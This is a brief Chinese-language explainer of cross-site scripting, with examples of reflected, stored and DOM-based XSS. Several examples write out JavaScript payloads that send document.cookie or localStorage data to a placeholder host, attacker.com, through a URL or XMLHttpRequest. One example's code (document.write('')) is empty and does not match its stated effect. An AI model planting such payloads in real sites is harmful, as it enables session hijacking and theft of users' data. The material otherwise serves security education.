# XSS跨站脚本攻击事例有哪些？

XSS跨站脚本攻击事例有哪些？
XSS攻击主要有反射型XSS、存储型XSS和DOM型XSS三种类型，以下是具体事例：

反射型XSS
钓鱼邮件攻击：攻击者伪装成银行客服发送邮件，邮件内容包含一个看似银行官方的链接，如“https://bank.example.com/login?q=window.location.href='http://attacker.com/phishing?cookie='+document.cookie;”，诱使用户点击。当用户点击该链接后，恶意脚本会将用户的Cookie信息发送到攻击者的服务器，攻击者可利用获取的Cookie登录用户账户。
搜索栏注入攻击：在一个存在反射型XSS漏洞的网站搜索栏中，攻击者输入“alert('XSS')”，当用户在该搜索栏进行搜索操作后，页面会弹出“XSS”的提示框，说明恶意脚本被执行。

存储型XSS
博客评论区攻击：攻击者在某博客文章的评论区输入一段恶意JavaScript代码，如“document.write('');”。当其他用户访问该文章查看评论时，浏览器会执行这段恶意脚本，将用户的Cookie信息发送到攻击者的服务器。
论坛留言攻击：在一个论坛的留言板中，攻击者留言“var xhr = new XMLHttpRequest();xhr.open('GET', 'http://attacker.com/log?data='+document.cookie, true);xhr.send();”，其他用户访问该留言页面时，其Cookie信息就会被窃取并发送给攻击者。

DOM型XSS
利用URL参数攻击：一个在线论坛存在DOM型XSS漏洞，攻击者在论坛帖子中留下恶意链接“http://forum.example.com/viewtopic.php?id=alert(document.cookie)”。当用户点击链接并访问该页面时，页面中的JavaScript会动态解析URL参数中的内容，并将其插入DOM中，导致恶意脚本执行，弹出包含用户Cookie信息的提示框。
利用HTML5本地存储攻击：某网站使用HTML5本地存储来保存用户的一些设置信息，攻击者通过构造恶意数据，如在本地存储中写入“var xhr = new XMLHttpRequest();xhr.open('GET', 'http://attacker.com/log?data='+localStorage.getItem('userData'), true);xhr.send();”，当网站读取本地存储中的数据并将其显示在页面上时，恶意脚本就会执行，导致用户数据泄露。
